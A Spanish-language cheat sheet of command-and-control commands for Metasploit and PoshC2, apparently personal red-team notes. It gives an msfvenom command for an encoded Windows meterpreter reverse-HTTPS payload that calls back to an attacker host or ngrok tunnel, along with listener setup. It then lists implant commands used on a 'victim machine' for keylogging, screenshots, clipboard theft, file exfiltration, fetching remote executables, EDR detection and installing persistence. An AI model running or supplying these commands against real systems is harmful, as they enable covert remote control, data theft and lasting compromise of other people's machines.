# **Command and Control * Resumen comandos**

## **Metasploit:**

Creación de beacons para los listeners de metasploit:
```bash
$ sudo msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<ip o dominio ngrok> LPORT=4443 -f exe
```

Dentro de metasploit inicializamos nuestros C2:
```bash
# Inicializamos la base de datos de metasploit:
$ sudo msfdb init

# Inicializamos el servicio (demonio) de metasploit:
$ sudo msfd 

# Ingresamos a metasploit:
$ sudo msfconsole

# Seteamos nuestro listener:
> use exploit/multi/handler
> set PAYLOAD windows/meterpreter/reverse_https
> set LHOST <ip o dominio ngrok>
> set LPORT 4443
> set SessionCommunicationTimeout 0
> set ExitOnSession false

# Lo ejecutamos con un job para seguimiento en 2do plano.
> exploit -j

# Interactuamos con la session:
> sessions -l # Lista las sessiones
> sessions -i <numero de la sesion>

```

## **PoshC2:**
1. Instalación
    
    Link de documentación: https://poshc2.readthedocs.io/en/latest/


    ```bash
    # Instalación de manera local: 
    $ curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash

    # Instalación en docker:
    $ apt install docker docker.io
    $ curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install-for-Docker.sh | sudo bash

    ```

2. Comandos usados para configuración:

    ```bash
    # Creación de proyectos:
    $ sudo posh-project -n <nombre_proyecto>

    # Configuración:
    $ sudo posh-config # se abrirá en el editor por defecto (vim en su mayoria)
    ```
    Dentro de la configuración se cambiaran 2 parametros generalmente:
    ```text
    PayloadCommsHost -> url de tu maquina escucha (ip de tu kali o tu ngrok).

    KillDate -> Fecha max que quieres que dure el beacon.
    ```

    Una vez realizado la configuración de tu proyecto se procede a ejecutar:
    ```bash
    $ sudo posh-server
    ```

3. Comandos usados para interacción usuario:
    
    
    ```bash
    # Logearse como usuario para interacción:
    $ sudo posh -u <usuario>

    # Revisar los logs del server:
    $ sudo posh-log
    
    ## Dentro del implante algunos comandos utiles:
    
    PS 1> get-userinfo # Información del usuario
    PS 1> get-computerinfo # Informacion de la maquina victima
    PS 1> find-allvulns # Enumeración de KB y vulnerabilidades potenciales
    PS 1> get-allservices # Listar todos los servicios

    # Enumeración de hosts 
    PS 1> invoke-arpscan # Enumeracion arp
    PS 1> invoke-hostenum -all 
    
    # Keylogger 
    PS 1> get-keystrokes # Ejecuta un keylogger por 60min
    PS 1> Get-KeystrokeData # Retorna la data al servidor
    
    # Screen y portapapeles
    PS 1> get-screenshot # Retorna un screenshot de la maquina victima
    PS 1> get-clipboard # Retorna el ultimo elemento copiado de la maquina victima
    
    # Descarga y carga de archivos
    PS 1> download-file -source 'c:\temp dir\run.exe' # Descarga de archivos de la maquina victima
    PS 1> download-files -directory 'c:\temp dir\' # Descarga de directorios.
    
    PS 1> upload-file -source 'c:\temp\run.exe' -destination 'c:\temp\test.exe'
    PS 1> web-upload-file -from 'http://www.example.com/app.exe' -to 'c:\temp\app.exe'
    
    # Detección de EDR:
    PS 1> invoke-edrchecker
    PS 1> invoke-edrchecker -force
    PS 1> invoke-edrchecker -remote <hostname>
    PS 1> invoke-edrchecker -remote <hostname> -ignore

    # Post-Explotación
    PS 1> install-servicelevel-persistence # Creacion de servicio de persistencia.
    PS 1> invoke-bloodhound -collectionmethod stealth # Para AD.
    
    # Persistencia:
    PS 1> installexe-persistence
    PS 1> removeexe-persistence
    ```

## **Referencias:**

https://redtm.com/red-teaming-toolkit/poshc2-commands-reference/

https://github.com/nettitude/PoshC2

https://www.rapid7.com/blog/post/2011/06/29/meterpreter-httphttps-communication/

